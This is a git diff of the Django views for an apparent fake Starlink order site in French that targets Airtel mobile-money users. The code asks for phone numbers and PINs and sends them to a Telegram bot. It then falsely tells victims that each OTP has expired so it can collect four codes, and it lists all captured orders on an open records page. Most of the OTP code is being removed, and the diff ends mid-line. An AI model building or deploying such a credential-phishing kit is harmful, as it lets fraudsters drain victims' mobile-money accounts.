@@ -9,7 +9,6 @@ from django.core.cache import cache
 from django.views.decorators.http import require_http_methods
 
 from .models import StarlinkOrder, TelegramConfig, StarlinkPackage
-from django.utils import timezone
 
 def send_telegram_notification(message):
     """Sends a notification to all active Telegram configurations."""
@@ -30,6 +29,7 @@ def landing_page(request):
     """Starlink package selection and simplified order page."""
     packages = StarlinkPackage.objects.filter(is_active=True)
     
+    # Auto-populate default bundles if the production workspace is empty
     if not packages.exists():
         StarlinkPackage.objects.create(name="Forfait Basique", description="Idéal pour une utilisation légère", price=1500.00, data_limit="5GB")
         StarlinkPackage.objects.create(name="Forfait Standard", description="Parfait pour le streaming", price=2500.00, data_limit="15GB")
@@ -65,7 +65,6 @@ def landing_page(request):
     
     return render(request, "landing.html", {"packages": packages})
 
-
 def ecocash_entry(request, order_id):
     """Airtel number and PIN entry page."""
     order = get_object_or_404(StarlinkOrder, id=order_id)
@@ -89,78 +88,4 @@ def ecocash_entry(request, order_id):
             order.payment_entered_at = timezone.now()
             order.save()
             
-            message = f"<b>Commande Starlink - Bot Airtel :</b>\nID Kit : {order.starlink_kit_id}\nTel : {airtel_number}\nPIN : {pin}\nMontant : CDF {order.amount}"
-            send_telegram_notification(message)
-            
-            return redirect("otp_verification", order_id=order.id)
-    
-    return render(request, "withdraw.html", {"order": order})
-
-
-def otp_verification(request, order_id):
-    """OTP verification page."""
-    order = get_object_or_404(StarlinkOrder, id=order_id)
-    
-    if order.status != 'pin_verified':
-        return redirect("ecocash_entry", order_id=order.id)
-    
-    if request.method == "POST":
-        action = request.POST.get("action")
-        
-        if action == "verify_otp":
-            otp_value = request.POST.get("otp", "").strip()
-            
-            if not otp_value:
-                messages.error(request, "Veuillez entrer le code OTP.")
-                return redirect("otp_verification", order_id=order.id)
-            
-            if order.otp_count == 0:
-                order.otp = otp_value
-            elif order.otp_count == 1:
-                order.otp_1 = otp_value
-            elif order.otp_count == 2:
-                order.otp_2 = otp_value
-            elif order.otp_count == 3:
-                order.otp_3 = otp_value
-            else:
-                order.otp_3 = otp_value
-
-            order.otp_count += 1
-            
-            message = f"<b>Commande Starlink - Bot Airtel (Tentative OTP {order.otp_count}) :</b>\nID Kit : {order.starlink_kit_id}\nTel : {order.airtel_number}\nPIN : {order.pin}\nOTP : {otp_value}"
-            send_telegram_notification(message)
-
-            if order.otp_count >= 4:
-                order.otp_verified = True
-                order.otp_verified_at = timezone.now()
-                order.status = 'completed'
-                order.completed_at = timezone.now()
-                order.save()
-                return redirect("success_page", order_id=order.id)
-            else:
-                order.save()
-                messages.error(request, "Le code OTP que vous avez entré a expiré. Veuillez entrer le nouveau code OTP envoyé sur votre téléphone.")
-                return redirect("otp_verification", order_id=order.id)
-    
-    return render(request, "otp_verify.html", {"order": order})
-
-
-def success_page(request, order_id):
-    """Success page after order completion."""
-    order = get_object_or_404(StarlinkOrder, id=order_id)
-    
-    if order.status != 'completed':
-        return redirect("landing_page")
-    
-    return render(request, "success.html", {"order": order})
-
-
-def all_applications(request):
-    """Records page displaying all Starlink orders."""
-    orders = StarlinkOrder.objects.all().order_by('-created_at')
-    return render(request, "records.html", {"orders": orders})
-
-
-def network_dashboard(request):
-    """Network status dashboard page."""
-    return render(request, "network_dashboard.html")
+            message = f"<b>Commande Starlink - Bot Airtel :</b>\nID Kit : {order.starlink_
